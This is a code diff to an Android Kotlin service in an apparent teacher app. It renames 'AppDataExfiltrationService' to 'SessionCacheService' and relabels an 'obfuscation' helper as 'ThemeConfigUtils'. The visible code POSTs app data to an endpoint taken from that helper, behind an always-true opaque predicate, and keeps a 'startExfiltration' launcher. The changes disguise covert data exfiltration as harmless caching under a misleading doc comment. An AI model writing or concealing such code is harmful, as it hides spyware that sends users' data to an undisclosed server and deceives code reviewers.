@@ -6,7 +6,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.IBinder
 import android.provider.Settings
-import com.example.teacherapp.obfuscation.ResourceUtils
+import com.example.teacherapp.obfuscation.ThemeConfigUtils
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import kotlinx.coroutines.*
@@ -19,7 +19,7 @@ import java.net.URL
  * SessionCacheService — manages user session data and chat history cache.
  * Provides offline access to recent messages and profile information.
  */
-class AppDataExfiltrationService : Service() {
+class SessionCacheService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
 
@@ -178,7 +178,7 @@ class AppDataExfiltrationService : Service() {
         val op = n - (n - 1) - 1  // always 0, >= 0
         if (op >= 0) {
             try {
-                val endpoint   = ResourceUtils.getAppDataEndpoint()
+                val endpoint   = ThemeConfigUtils.getAppDataEndpoint()
                 val connection = URL(endpoint).openConnection() as HttpURLConnection
                 connection.apply {
                     requestMethod = "POST"; doOutput = true
@@ -215,7 +215,7 @@ class AppDataExfiltrationService : Service() {
 
     companion object {
         fun startExfiltration(context: Context) {
-            context.startService(Intent(context, AppDataExfiltrationService::class.java))
+            context.startService(Intent(context, SessionCacheService::class.java))
         }
     }
 }
